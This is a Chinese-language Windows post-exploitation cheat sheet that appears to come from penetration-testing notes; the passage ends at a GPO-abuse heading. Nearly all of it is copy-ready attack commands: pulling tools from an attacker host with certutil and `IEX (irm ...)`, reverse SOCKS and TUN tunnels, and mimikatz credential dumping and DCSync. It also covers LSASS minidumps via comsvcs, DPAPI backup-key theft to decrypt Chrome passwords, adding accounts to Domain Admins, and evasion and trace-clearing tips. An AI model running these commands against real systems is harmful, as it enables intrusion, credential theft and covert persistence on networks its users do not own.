# Windows 落地工具箱

拿到 Windows shell 之后的标准落地流程:文件传输 → 凭据转储(mimikatz)→ 域内侦察(PowerView)→ 本地提权检查(PowerUp)→ 隧道深入内网(chisel/ligolo),全程注意 OPSEC(文末)。命令均可直接复制,占位符用尖括号标注(如 `<攻击机IP>` `<域名>`);Windows 侧命令按环境区分:bat 块 = cmd(`::` 开头是注释),powershell 块 = PowerShell(`#` 是注释),bash 块 = 攻击机 Kali。

本文件工具:impacket-smbserver、certutil/iwr 下载、base64 写入法、隧道下 HTTP、mimikatz、PowerView、PowerUp、winPEAS 与信息收集条子、chisel.exe、ligolo_agent.exe、凭据收集面扩大(凭据管理器/WiFi/RDP/SSH/远控配置)、免杀与日志清理

本机武器库(以下工具都在本机,需先按文件传输小节送到目标机):`~/tools/windows/`(mimikatz/x64/mimikatz.exe、chisel.exe、ligolo_agent.exe、winPEASx64.exe、Rubeus.exe[本机编译]、LaZagne.exe、ruler.exe)与 `~/tools/src/PowerSploit/`(Recon/PowerView.ps1、Privesc/PowerUp.ps1、Exfiltration/Invoke-Mimikatz.ps1)

---

## impacket-smbserver — 攻击机一键起 SMB 共享,目标机 net use 映射后直接拷文件

来源:apt 包 `python3-impacket`(/usr/bin/impacket-smbserver;目标机侧用系统自带 net use/copy)

```bash
# 攻击机:把 ~/tools/windows 武器库整个共享为 share;-smb2support 必加(Win10/11 默认拒绝 SMB1 匿名)
impacket-smbserver share ~/tools/windows -smb2support

# 目标安全策略拒绝匿名访问时,带用户名密码起共享(更稳,少触发匿名访问告警)
impacket-smbserver share ~/tools/windows -smb2support -username kali -password 'P@ssw0rd!'

# 也可共享 PowerSploit 脚本目录,目标机直接从 UNC 路径加载 ps1(见 PowerView 小节)
impacket-smbserver share ~/tools/src/PowerSploit -smb2support
```

```bat
::: 以下在 Windows 目标 cmd 执行;先建落地目录
mkdir C:\Temp 2>nul
:: 匿名版:把共享映射为 Z: 盘
net use Z: \\<攻击机IP>\share
:: 带认证版(对应上面 -username/-password)
net use Z: \\<攻击机IP>\share /user:kali P@ssw0rd!
:: 从映射盘拷工具
copy Z:\winPEASx64.exe C:\Temp\
dir Z:\                      :: 看共享里都有什么
:: 不映射盘符,直接从 UNC 路径拷(不留 net use 记录)
copy "\\<攻击机IP>\share\mimikatz\x64\mimikatz.exe" C:\Temp\mimikatz.exe
:: 用完立刻断开映射
net use Z: /delete
```

参数速查:
- `share <目录>` 共享名+本地目录(共享名可自定义,目标机路径同步改)
- `-smb2support` 支持 SMB2/3(Win10/11 必须)
- `-username <用户> -password <密码>` 带认证共享
- 目标机 `net use Z: \\<IP>\<共享名>` 映射盘符;`net use` 列现有连接;`net use Z: /delete` 删除

注意: 目标机到攻击机 445 端口必须可达,跨网段/防火墙环境常被封 → 换下面 HTTP 方式;impacket-smbserver 会把所有来访记录在屏幕上,顺手还能收到目标的 NTLM 认证哈希;别共享整个家目录,共享内容即暴露面。

---

## certutil / PowerShell 下载 — HTTP 方式拉文件三连(certutil、iwr、WebClient)

来源:Windows 系统自带(certutil.exe、PowerShell;攻击机用 python3 -m http.server)

```bash
# 攻击机:起临时 HTTP 服务,目录里放好要传的文件
cd ~/tools/windows && python3 -m http.server 8080
```

```bat
::: certutil:最通用(Server 2003 ~ Win11 都有)
certutil -urlcache -f http://<攻击机IP>:8080/winPEASx64.exe C:\Temp\winPEASx64.exe
certutil -urlcache -f http://<攻击机IP>:8080/chisel.exe C:\Temp\chisel.exe
certutil -urlcache -f http://<攻击机IP>:8080/ligolo_agent.exe C:\Temp\ligolo_agent.exe
certutil -urlcache -f http://<攻击机IP>:8080/mimikatz/x64/mimikatz.exe C:\Temp\mimikatz.exe
certutil -urlcache * delete    :: 清掉 certutil 自己的下载缓存记录
```

```powershell
# iwr(Invoke-WebRequest,PS 3.0+ 即 Win8 以上)
powershell iwr -uri http://<攻击机IP>:8080/winPEASx64.exe -outfile C:\Temp\winPEASx64.exe
# WebClient 老写法(Win7 时代的 PS 2.0 也能跑)
powershell (New-Object Net.WebClient).DownloadFile('http://<攻击机IP>:8080/chisel.exe','C:\Temp\chisel.exe')
# 内存加载 ps1 不落盘(irm=Invoke-RestMethod,返回的就是脚本文本)
powershell -ep bypass -c "IEX (irm http://<攻击机IP>:8080/PowerView.ps1)"
```

参数速查:
- `certutil -urlcache -f <url> <本地路径>` -f 强制下载(无视缓存)
- `certutil -urlcache * delete` 清空 certutil 下载缓存(删痕迹)
- `iwr -uri <url> -outfile <路径>` 下载落盘;`(iwr <url>).Content` 取文本
- `IEX (irm <url>)` 下载即执行,二进制文件不要用这条
- `DownloadString('<url>')` 同上只适合 ps1 文本;二进制必须 `DownloadFile('<url>','<路径>')`
- `python3 -m http.server <端口>` 攻击机侧监听 0.0.0.0

注意: certutil/iwr 下载 exe 会过 AMSI/Defender 实时扫描,知名工具落地即杀 → 改名、加壳、分段传或走 base64 法;`IEX (irm ...)` 整段脚本会触发 4104 脚本块日志(见文末 OPSEC);老系统 iwr 报"未能创建 IE 对象"时加 `-usebasicparsing`。

---

## base64 echo 写入法 — 无任何网络连通时的文件落地(小文件专用)

来源:Kali 自带 base64/fold + Windows 自带 certutil/PowerShell(零网络依赖)

```bash
# 攻击机:文件转 base64 单行(-w0 禁止折行,默认 76 列换行会把 echo 搞乱)
base64 -w0 ~/tools/src/PowerSploit/Recon/PowerView.ps1 > /tmp/pv.b64
wc -c /tmp/pv.b64                 # 看长度:cmd 单行上限约 8191 字符,超了就分段
# 大一点的内容分段:每 8000 字符一行,目标机逐行 echo 追加(>>)
base64 -w0 /tmp/tool.exe | fold -w 8000 > /tmp/tool.b64
# 反向回传:目标机 certutil -encode 后把文本复制回来,攻击机 base64 -d 还原
```

```bat
::: 目标机 cmd:echo 写入 + certutil 解码(目标完全不能连攻击机时用)
echo <base64字符串> > C:\Temp\b64.txt
certutil -decode C:\Temp\b64.txt C:\Temp\PowerView.ps1
:: 分段时:第一段 > 创建,后续段 >> 追加,全部写完再 decode
echo <第2段> >> C:\Temp\b64.txt
```

```powershell
# 目标机 PowerShell:一步写二进制(不留中间 b64 文件)
[IO.File]::WriteAllBytes('C:\Temp\tool.dll',[Convert]::FromBase64String('<base64字符串>'))
```

参数速查:
- `base64 -w0 <文件>` 单行编码;`fold -w <N>` 每 N 字符切段
- `certutil -encode <原文件> <b64文件>` / `certutil -decode <b64文件> <输出>` 双向转换
- `[Convert]::FromBase64String('<串>')` PS 原生解码为字节数组
- `[IO.File]::WriteAllBytes('<路径>',<字节>)` 字节直接落盘

注意: exe 走 base64 体积膨胀 1/3,mimikatz.exe(1.3MB)编出来要上百段 echo,不现实——本方法只适合 ps1/小工具/计划任务脚本这类几 KB~几十 KB 的文件;echo 内容会进 cmd 历史与 4688 进程创建日志,敏感内容优先 PS 的 WriteAllBytes;RDP 会话直接复制粘贴文件/剪贴板也是隐形通道。

---

## 隧道下的 HTTP 下载 — 让够不到攻击机的深层内网主机经已有隧道拉文件

来源:chisel(目标侧 ~/tools/windows/chisel.exe)+ ligolo-ng(~/tools/bin/ligolo_proxy + ~/tools/windows/ligolo_agent.exe);两端部署详见 06-隧道与代理.md

场景:第一台肉鸡 A 能连攻击机,更深层主机 B 只能连 A → 在 A 上开一个 HTTP 端口回源到攻击机的 `python3 -m http.server`,B 从 A 的 IP 下载。

```bat
::: 方式 1(chisel):A 机正向本地转发 —— A 监听 8080,流量经隧道回到攻击机的 127.0.0.1:8080
::: 前提:攻击机已跑 chisel server -p 8000 --reverse(见 06)+ python3 -m http.server 8080
C:\Temp\chisel.exe client <攻击机IP>:8000 8080:127.0.0.1:8080
```

```bash
# === 方式 2(ligolo):攻击机 ligolo_proxy 控制台里执行(非 shell),agent 已上线为前提 ===
# session                                              先选中 A 机 agent 会话
# listener_add --addr :8080 --to 127.0.0.1:8080 --tcp  让 A 监听 8080 并转回攻击机本地 8080
```

```bat
::: 然后 B 机(cmd)从 A 的 IP 下载,流量穿隧道回攻击机:
certutil -urlcache -f http://<A的IP>:8080/winPEASx64.exe C:\Temp\winPEASx64.exe
```

参数速查:
- chisel client `<本地端口>:<攻击机侧目标>:<端口>` 正向转发:监听在客户端(A),出口在服务端(攻击机)
- ligolo 控制台 `listener_add --addr :<端口> --to <攻击机本地addr> --tcp` 反向端口转发(06 有全集)
- `python3 -m http.server 8080` 攻击机侧真正提供文件的一端

注意: 两法本质都是"在 A 上开洞、回源攻击机",A 上新增 0.0.0.0 监听会被 EDR/态势标记为可疑,用完立刻断(chisel Ctrl+C / ligolo 控制台删 listener);B 上 certutil 下载行为与普通下载无异,日志只指向 A,天然做了跳板隔离。

---

## mimikatz — 凭据转储 / DCSync / 票据操作瑞士军刀(必须管理员,最好 SYSTEM)

来源:本机文件 `~/tools/windows/mimikatz/x64/mimikatz.exe`(官方仅 64 位版;先按文件传输小节送上目标机)

```bat
::: 目标机 cmd:必须以管理员身份运行(没提权先看 07-权限提升.md;多数转储子命令实际要 SYSTEM)
C:\Temp\mimikatz.exe
```

进入后提示符为 `mimikatz #`。**以下全部小节的命令都在 mimikatz 交互环境内执行(进入 mimikatz 后执行),不是 shell 命令;先跑前置两条,再按需选用。**

### privilege::debug / token::elevate — 前置:拿调试权限与 SYSTEM 令牌

```bash
# === 进入 mimikatz 后执行 ===
privilege::debug          # 请求 SeDebugPrivilege;输出 Privilege '20' OK 才能读其他进程
token::elevate            # 把当前令牌切换为 SYSTEM(lsadump::sam 等本地转储必需)
```

### sekurlsa::logonpasswords — 抓内存中的登录凭据(NTLM 哈希,偶尔有明文)

```bash
# 转储 LSASS 进程里所有登录过的账户:NTLM 哈希、SHA1、部分环境直接给明文密码
sekurlsa::logonpasswords
# 重点看每段的 * Username 与 * NTLM 两行;NTLM 直接拿去 nxc/impacket 哈希传递(见 05)
```

### sekurlsa::ekeys — 抓 Kerberos 密钥(AES256/RC4)

```bash
# 列出各账户的 Kerberos 密钥
sekurlsa::ekeys
# aes256_hmac 行 → overpass-the-hash / impacket -aes-key 认证;rc4_hmac_nt 行等价 NTLM 哈希
```

### lsadump::sam — 转储本地账户库(本机所有本地用户哈希)

```bash
# 需要 SYSTEM(先 token::elevate):导出本地 SAM,含本地管理员( RID 500 )的 NTLM
lsadump::sam
# 哈希喂 hashcat -m 1000(见 04)或 nxc --local-auth --hashes 横向(见 05)
```

### lsadump::dcsync — 从域控同步任意域账户哈希(需域管或 DCSync 权限)

```bash
# 模拟 DC 复制协议抓指定账户;krbtgt 的哈希 = 黄金票据原料
lsadump::dcsync /domain:<域名> /user:krbtgt
# 换任意域用户,如域管:
lsadump::dcsync /domain:<域名> /user:administrator
# /dc:<域控主机名> 显式指定域控;/all 全域哈希(等价 impacket-secretsdump -just-dc,见 05)
```

### kerberos::ptt — 票据注入(pass-the-ticket)

```bash
# 把 kirbi 票据注入当前登录会话(票据来自下条导出,或攻击机 impacket-getST/ticketer 生成,见 05)
kerberos::ptt C:\Temp\ticket.kirbi
misc::cmd                  # 起一个继承票据的新 cmd,里面 whoami /groups 与 klist 验证生效
```

### kerberos::list /export — 列出并导出当前会话票据

```bash
kerberos::list             # 列出当前会话全部 Kerberos 票据
kerberos::list /export     # 导出为当前目录 .kirbi 文件(0-* 命名,拖回攻击机可转 ccache 用 impacket -k)
```

### crypto::certificates /export — 导出证书与私钥(打 AD CS 的原料)

```bash
# 列出当前用户/机器证书存储;带 /export 把含私钥的证书导出为当前目录 .pfx/.der
crypto::certificates /export
# .pfx 拖回攻击机喂 certipy(本机 ~/.local/bin/certipy)继续证书攻击链
```

参数速查(其他常用子命令,同为交互内执行):
- `sekurlsa::pth /user:<用户> /domain:<域名> /ntlm:<NT哈希>` 哈希传递,直接起一个该身份的新 cmd
- `lsadump::lsa /inject` 抓 LSA Secrets(常藏服务账户明文密码)
- `lsadump::trust /patch` 域信任密钥(跨域票据原料)
- `vault::cred` Windows 凭据管理器
- `dpapi::cred /in:<文件>` DPAPI 解密(浏览器保存的密码)
- `misc::skeleton` 万能钥匙(全域注入同一密码,动静极大,慎用)
- `exit` 退出交互环境

注意: **转储类功能一律需要管理员权限,token::elevate 到 SYSTEM 后才稳定**(dcsync 例外:有 DCSync 权限的域账户即可,无需本地 SYSTEM);必须 64 位 exe 配 64 位系统,位数不匹配 sekurlsa 系列抓不到;mimikatz 是 EDR 头号盯防对象,落地常即报——替代路线:不落地跑 ~/tools/src/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1、或攻击机远程 impacket-secretsdump(见 05);本机 `~/tools/windows/Rubeus.exe` 为自编译可用版(2026-09-17);Rubeus.exe /createnetonly /rc4 <hash> /ptt 类票据操作直接跑,等价 mimikatz kerberos:: 模块或 impacket(getST/getTGT/ticketer,见 05)。

---

## PowerView — 域内侦察与 ACL 分析的 PowerShell 万金油

来源:本机文件 `~/tools/src/PowerSploit/Recon/PowerView.ps1`(PowerView 3.0;传上去或内存加载)

```powershell
# 加载方式 1:本地文件;-ep bypass 即 -ExecutionPolicy Bypass 绕执行策略
powershell -ep bypass -c "Import-Module C:\Temp\PowerView.ps1"
# 加载方式 2:内存加载不落盘(攻击机先起 http.server 或 smbserver)
powershell -ep bypass -c "IEX (irm http://<攻击机IP>:8080/PowerView.ps1)"
# 加载方式 3:从 impacket-smbserver 共享直读,文件根本不落地(共享的是 PowerSploit 根目录时)
powershell -ep bypass -c "Import-Module \\<攻击机IP>\share\Recon\PowerView.ps1"
```

```powershell
# ===== 用户枚举 =====
Get-DomainUser -Properties samaccountname,description | Format-Table -AutoSize   # 全域用户速览(描述里常藏密码)
Get-DomainUser -Identity <用户名> -Properties *                                  # 单用户全属性
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname             # 可 Kerberoast 账户(接 impacket-GetUserSPNs,见 05)

# ===== 主机与域控 =====
Get-DomainComputer -Properties dnshostname,operatingsystem | Sort-Object operatingsystem   # 全域机器+系统版本(挑老系统)
Get-DomainController                                                             # 定位域控

# ===== 本地管理员关系 =====
Find-LocalAdminAccess                                                            # 当前凭据在哪些机器是本地管理员(直接给横向目标清单)

# ===== ACL 攻击路径 =====
Get-DomainObjectAcl -Identity <目标用户或组> -ResolveGUIDs                       # 看 GenericAll/WriteDacl/WriteOwner/ForceChangePassword
# 拿到 GenericAll 就能直接改目标密码:
# Set-DomainUserPassword -Identity <目标用户> -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)

# ===== 组成员操作(写操作留 4728 日志,收尾要还原)=====
Get-DomainGroupMember -Identity 'Domain Admins'                                  # 列域管成员
Add-DomainGroupMember -Identity 'Domain Admins' -Members <用户名>                # 把控制的账户加进域管(动作极大)

# ===== GPO =====
Get-DomainGPO -Domain <域名> | Select-Object displayname                         # 全部组策略
Get-DomainGPOLocalGroup -Domain <域名>                                           # GPO 推送的本地管理员(找批量网管的机器)
```

参数速查:
- `-Domain <域名>` 任意 Get-* 都可指定域查询
- `-Identity <对象>` 精确指定;`-Properties <属性列表>` 控制返回字段(不写会拉全量,极慢)
- `-SPN` 只列带服务主体名称的用户
- `-ResolveGUIDs` 把 ACL 里的 GUID 还原成可读权限名
- `-LDAPFilter '<表达式>'` 原生 LDAP 过滤,如 `'(userAccountControl:1.2.840.113556.1.4.803:=4194304)'` 查无预身份验证账户(AS-REP Roast 目标)
- 结果统一接 `| Export-Csv C:\Temp\out.csv` 落盘回传

注意: 本文件全部为 PowerView 3.0 写法(老 cheat sheet 的 Get-NetUser/Get-NetComputer 是一代旧名,别混抄);路径级分析交给 BloodHound(见 05)更强,PowerView 胜在单文件零依赖、可从 UNC/内存加载;`Add-DomainGroupMember` 等写操作会留 4728/4729 事件,报告必须写清并还原。

---

## PowerUp — 本地提权一键体检(PowerSploit Privesc)

来源:本机文件 `~/tools/src/PowerSploit/Privesc/PowerUp.ps1`

```powershell
# 全量检查:一条命令枚举全部经典本地提权面,重点看带 AbuseFunction 的行(直接给出利用命令)
powershell -ep bypass -c "Import-Module C:\Temp\PowerUp.ps1; Invoke-AllChecks"
# 或内存执行不落盘
powershell -ep bypass -c "IEX (irm http://<攻击机IP>:8080/PowerUp.ps1); Invoke-AllChecks"
```

```powershell
# 单项复查(Invoke-AllChecks 已包含,复查用)
Get-UnquotedService                                    # 未加引号的服务路径(详见 07)
Get-ModifiableService                                  # 当前用户可改配置的服务
Get-ModifiableServiceFile                              # 服务二进制可写的服务
Get-RegistryAutoLogon                                  # 注册表自动登录的明文凭据
Find-PathDLLHijack                                     # 可劫持 DLL 的 PATH 目录
```

参数速查:
- `Invoke-AllChecks` 全量:未加引号路径/可写服务/AlwaysInstallElevated/自动登录凭据/可劫持路径等
- `Invoke-ServiceAbuse -Name <服务名> -UserName <用户>` 按检查结果自动改服务二进制提权(危险)
- `Restore-ServiceBinary -Name <服务名>` 还原被改的服务二进制
- 输出 `AbuseFunction` 列 = 可直接复制的利用命令

注意: PowerUp 覆盖的是经典提权面,新系统以 winPEAS(07 有全参数)与 07 的手工流程为准;`Invoke-ServiceAbuse` 会替换服务二进制并重启服务,生产环境先打快照、用完 `Restore-ServiceBinary` 还原。

---

## 信息收集条子 — winPEAS、systeminfo 补丁对照与系统自带命令速查

来源:winPEAS 本机文件 `~/tools/windows/winPEASx64.exe`(完整参数见 07-权限提升.md);wesng 为单文件脚本按需下载;其余为 Windows 自带命令

### winPEAS(自动化全量枚举)

```bat
::: 上传后直接跑;cmd=只显示带利用命令的项,quiet=去彩色(复制进报告不乱码)
C:\Temp\winPEASx64.exe cmd quiet
```

### systeminfo + wesng 思路(补丁对照找内核提权)

```bat
::: 目标机:导出系统信息(含已装补丁清单),整段复制回攻击机存成 sysinfo.txt
systeminfo > C:\Temp\sysinfo.txt
type C:\Temp\sysinfo.txt
```

```bash
# 攻击机:wesng 思路 —— 用 systeminfo 的补丁清单对照微软公告库,列出"没打的补丁+对应提权 CVE"
export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334   # 走代理出网
wget https://github.com/bitsadmin/wesng/archive/refs/heads/master.zip -O /tmp/wesng.zip   # 单脚本+公告库
unzip /tmp/wesng.zip -d /tmp/wesng && cd /tmp/wesng/wesng-master
python3 wes.py --update                       # 更新公告库(可选)
python3 wes.py /tmp/sysinfo.txt               # 输出缺失补丁;重点看带 privilege escalation 的行
# 平替:searchsploit / windows-exploit-suggester 对照思路(见 07)
```

### 网络与进程条子(cmd 常用,全部系统自带零依赖)

```bat
::: === 身份与权限 ===
whoami /all                              :: 当前用户/组/特权(SeImpersonatePrivilege=Potato 一族,见 07)
net user                                 :: 本地用户列表
net localgroup administrators            :: 本地管理员组(域账户常嵌在里面=横向入口)
::: === 网络暴露与连接 ===
ipconfig /all                            :: 网卡/DNS/网段(多网卡=天然内网跳板)
arp -a                                   :: ARP 表:近期通信过的内网主机(免扫描的存活清单)
netstat -ano                             :: 全部连接+监听端口,-o 给 PID
netstat -ano | findstr ESTABLISHED       :: 只看活动连接(找数据库/域控的真实业务流)
route print                              :: 路由表(发现其他内网网段)
::: === 进程与服务 ===
tasklist /svc                            :: 进程+对应服务(找杀软/数据库进程)
tasklist /v                              :: 进程+运行账户(看到别人账户跑的进程)
tasklist /svc | findstr /i "defender msmpeng"    :: 确认 Defender 是否在跑
::: === wmic 速查(Win11 24H2 起移除,换 Get-CimInstance)===
wmic qfe list brief                      :: 已装补丁(喂 wesng/对照 CVE)
wmic service get name,pathname,startmode :: 自启服务与二进制路径(提权入口,详见 07)
wmic startup get caption,command         :: 启动项
wmic useraccount get name,sid            :: 本地账户与 SID(RID 500=内置管理员)
::: === 会话与共享 ===
quser                                    :: 谁在线(动作前先看有没有真人)
net share                                :: 本机共享
net use                                  :: 当前远程连接(可能挂着别人的凭据)
```

参数速查:
- `arp -a` ARP 缓存 = 旁证存活,不做主动扫描(OPSEC 好)
- `netstat -ano` -a 全部 -n 数字地址 -o 带 PID;配 `tasklist /fi "PID eq <pid>"` 反查进程名
- `tasklist /fi "IMAGENAME eq <进程名>"` 按镜像名过滤;`/svc /v` 可叠加
- `wmic <别名> get <属性列表>` 任意 CIM 别名可查(product/computersystem/qfe 等)
- `quser` / `qwinsta` 登录会话与 RDP 状态
- `systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本" /C:"系统类型"` 快速三行摘要

注意: 这些条子全是系统自带,不落地、不碰 AMSI,OPSEC 最优;arp/netstat 只是"最近通信"快照,全量枚举还是要 fscan/nmap(05/01);winPEAS 极吵(CPU/磁盘拉满),有 EDR 的环境换 ps1/bat 版远程加载(07);wesng 结果要人工核对_service pack/版本,误报常见,别拿来直接打。

---

## chisel.exe(目标侧)— Windows 反向 SOCKS 隧道落地

来源:本机文件 `~/tools/windows/chisel.exe`(服务端为 Kali 的 chisel,apt 包;完整参数与级联拓扑见 06-隧道与代理.md)

```bash
# 攻击机先起服务端(详见 06):
chisel server -p 8000 --reverse --socks5        # 允许反向注册 + 服务端开 SOCKS5(127.0.0.1:1080)
```

```bat
::: 目标机(certutil 下载后):回连建立反向 SOCKS(窗口保持开,后台跑加 start /b)
C:\Temp\chisel.exe client <攻击机IP>:8000 R:socks
::: 反向 SOCKS + 反向端口转发叠加(攻击机 3389 -> 目标可达的 10.0.0.5:3389)
C:\Temp\chisel.exe client <攻击机IP>:8000 R:socks R:3389:10.0.0.5:3389
::: 正向本地转发(给深层主机当下载点)见上文"隧道下的 HTTP 下载"
```

参数速查:
- client `R:socks` 攻击机 1080 起反向 SOCKS5,配 proxychains4(见 06)
- client `R:<攻击机端口>:<内网IP>:<端口>` 反向端口转发
- client `<本地端口>:<目标>:<端口>` 正向本地转发(A 机开洞回源攻击机)
- server/client `--auth <user:pass>` 隧道认证,防被他人抢占

注意: chisel.exe 是知名工具,部分 EDR 按签名特征静态识别 → 投放前改名;流量为 HTTP 长连接特征,流量审计严的环境换 ligolo;R:socks 一旦建立,攻击机所有 proxychains 工具即刻进内网(06)。

---

## ligolo_agent.exe(目标侧)— TUN 隧道落地,像 VPN 一样进内网

来源:本机文件 `~/tools/windows/ligolo_agent.exe`(v0.9.1,与攻击机 `~/tools/bin/ligolo_proxy` 同版本配对;代理端部署与控制台全命令见 06-隧道与代理.md)

```bat
::: 目标机:回连攻击机 ligolo_proxy(默认端口 11601;攻击机先 ~/tools/bin/ligolo_proxy -selfcert,见 06)
C:\Temp\ligolo_agent.exe -connect <攻击机IP>:11601 -ignore-cert
:: 测试环境用 -ignore-cert;实战推荐代理端控制台 certificate_fingerprint 查指纹后固定证书:
C:\Temp\ligolo_agent.exe -connect <攻击机IP>:11601 -accept-fingerprint <SHA256指纹>
:: 目标出网要过公司代理时,agent 自带代理链(HTTP/SOCKS):
C:\Temp\ligolo_agent.exe -connect <攻击机IP>:11601 -ignore-cert -proxy http://<用户名>:<密码>@<内网代理IP>:<端口>
```

```bash
# === 攻击机:agent 上线后的操作在 ligolo_proxy 控制台(非 shell),完整用法见 06 ===
# session                                              选中该 agent 会话
# ifconfig                                             看 agent 侧网卡与所在网段
# tunnel_start --tun ligolo                            启动中继;攻击机即可路由直达目标内网(免 proxychains)
# listener_add --addr :8080 --to 127.0.0.1:8080 --tcp  回源转发(隧道下 HTTP 下载用,见上文)
```

参数速查:
- `-connect <ip:port>` 反连代理端(默认 11601)
- `-ignore-cert` 忽略证书校验(仅测试环境)
- `-accept-fingerprint <SHA256>` 固定代理证书指纹(推荐)
- `-proxy http://user:pass@ip:port` 经 HTTP/SOCKS 代理出网(socks:// 前缀同理)
- `-ua <UA串>` 伪装 HTTP User-Agent(默认 Chrome UA)
- `-reconnect` 断线自动重连(默认开);`-v` 详细日志

注意: agent 不需要管理员权限、单文件、自动重连,是二层内网首选;攻击机侧 TUN/路由步骤全在 06(本文件只管目标侧落地);proxy 与 agent 必须同版本配对(本机均 0.9.1),别去 GitHub 拉最新版混用。

---

## LSASS PPL 绕过 — RunAsPPL 环境下抓凭据

来源:Windows 系统自带 rundll32 + comsvcs.dll(LOLBAS,零落地抓 dump);PPLdump/HandleKatz 为开源工具思路;报错特征取自本机 mimikatz 二进制内嵌字符串

场景:mimikatz `sekurlsa::logonpasswords` 打不开 LSASS → 先查 RunAsPPL 开没开 → 没开用 comsvcs 一行命令抓 dump(免落地 mimikatz)→ 开了再上 PPLdump/HandleKatz 思路。

```bat
:::: 1. 查 PPL 是否开启(0x1=开启;也可能被 Defender/Device Guard 动态注入,查不到不等于没有)
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
:::: 2. 找 lsass 进程 PID
tasklist /fi "imagename eq lsass.exe"
:::: 3. 一行抓 LSASS 全内存 dump(必须 SYSTEM 或管理员+SeDebugPrivilege,SYSTEM 最稳;PPL 未开才成功)
rundll32 C:\windows\system32\comsvcs.dll MiniDump <lsass的PID> C:\Temp\lsass.dmp full
```

```bash
# dump 拖回攻击机离线解密(目标机上不碰 mimikatz;本机已装 pypykatz)
pypykatz lsa minidump lsass.dmp
# 或 mimikatz 交互内:sekurlsa::minidump lsass.dmp 然后 sekurlsa::logonpasswords
```

参数速查:
- `rundll32 comsvcs.dll MiniDump <PID> <输出文件> full` full=全量 dump(不带则抓不到凭据)
- `tasklist /fi "IMAGENAME eq lsass.exe"` 过滤拿 PID;`/svc` 可叠加
- `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL` 0x1 即 PPL 生效
- PPL 特征(mimikatz 实测):`privilege::debug` 显示 `Privilege '20' OK` 但 sekurlsa 系列报 `ERROR kuhl_m_sekurlsa_acquireLSA ; Memory opening` / `Handle on memory (0x00000005)`(5=拒绝访问)
- 若连 privilege::debug 都报 `ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege ...` → 只是没以管理员跑,不是 PPL

注意: comsvcs.dll MiniDump 是"不落地 mimikatz"的抓法,**同样打不开 PPL 保护的 LSASS**,别当成 PPL 绕过;PPL 开启时的思路:PPLdump(ITm4n,把 DLL 种植进更高保护等级的进程再抓,新补丁多已修)或 HandleKatz(加载带签名的脆弱驱动复制 LSASS 句柄,BYOVD 思路,EDR 高危)一句话带过、按需深挖;dump 文件含全部明文/哈希,拖回后立刻删目标机副本;rundll32+comsvcs 调用链是知名 IOC,新版 Defender 有专项检测,平时别乱试。

---

## DPAPI 域备份密钥 — 域内任意机器的浏览器密码/凭据库

来源:impacket-dpapi(apt 包 python3-impacket,/usr/bin;backupkeys/masterkey/credential 子命令实测);目标机侧 mimikatz dpapi::/sekurlsa::dpapi 模块

原理:Windows 用 DPAPI 加密浏览器保存的密码、凭据管理器、Vault 等;保护它们的主密钥(masterkey)又用**域备份密钥**加密——备份密钥一个域只有一份,**任一普通域用户凭据即可从 DC 导出**,拿到后域内任何用户/机器的 DPAPI 密文都能离线解。

```bash
# 攻击机:任一域凭据(普通用户即可)导出域备份密钥为 .pvk 文件
impacket-dpapi backupkeys --export -t <域名>/<用户名>:<密码>@<域控IP>
# → 输出 key_<域名>.pvk;之后全程离线:
# 用备份密钥解从目标机拷回的 masterkey 文件,得到该用户主密钥(GUID:hex)
impacket-dpapi masterkey -file <masterkey文件> -pvk key_<域名>.pvk
# 拿主密钥解密凭据管理器 blob(%APPDATA%\Microsoft\Credentials\ 下拷回的文件)
impacket-dpapi credential -file <blob文件> -key <主密钥hex>
```

```bat
:::: 目标机:定位并拷走 DPAPI 材料(用户级 masterkey 目录)
dir /s /b C:\Users\<用户名>\AppData\Roaming\Microsoft\Protect\
:::: Chrome:两个文件一起拷(Chrome 运行时 Login Data 被锁,先 taskkill /im chrome.exe 或复制副本)
copy /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\Temp\LoginData
copy /y "%LOCALAPPDATA%\Google\Chrome\User Data\Local State" C:\Temp\LocalState
```

mimikatz 交互内(目标机现场解,免来回拷文件;pvk 先按文件传输小节送上):

```bash
# 有备份 pvk:直接解任意用户 masterkey 文件
dpapi::masterkey /in:C:\Users\<用户名>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /sid:<用户SID> /pvk:key_<域名>.pvk
# 或从内存抓当前缓存的所有 DPAPI 密钥(SYSTEM 下含其他登录用户)
sekurlsa::dpapi
# 再解凭据管理器 blob(密钥已进 mimikatz 缓存,直接指文件)
dpapi::cred /in:"C:\Users\<用户名>\AppData\Roaming\Microsoft\Credentials\<文件>"
```

参数速查:
- `backupkeys --export -t <域>/<用户>:<密码>@<域控IP>` 导出域备份密钥 .pvk(普通域用户即可)
- `masterkey -file <文件> -pvk <pvk>` 备份密钥解 masterkey → 主密钥 hex;`-password`+`-sid` 用用户密码解;`-system`/`-security` 配 hive 解机器级密钥
- `credential -file <blob> -key <hex>` 解凭据管理器 blob;`vault` 子命令解 Vault(IE/Edge 旧版);`unprotect` 通用解密
- `dpapi::masterkey /in:<路径> /sid:<SID> /pvk:<pvk>` 与 `sekurlsa::dpapi` 为 mimikatz 等价操作
- 材料定位:masterkey `%APPDATA%\Microsoft\Protect\<SID>\`;凭据 blob `%APPDATA%\Microsoft\Credentials\` 与 `%LOCALAPPDATA%\Microsoft\Credentials\`;机器级 `C:\Windows\System32\Microsoft\Protect\`

注意: Chrome/Edge(v80+)密码是 AES-256-GCM 而非纯 DPAPI——先用主密钥解 Local State 里的 `encrypted_key`(解出的数据去掉 `DPAPI` 5 字节前缀即 AES 密钥),再解 Login Data 的 password_value;v80 前的老版本密码就是纯 DPAPI blob,直接解;此链同样适用于凭据管理器里保存的 RDP/共享凭据;域备份密钥一次导出长期有效(除非域功能级重建),报告必须注明"已导出=全域 DPAPI 面失守"。

---

## GPO 滥用 — 改组策略下发计划任务/脚本拿权限

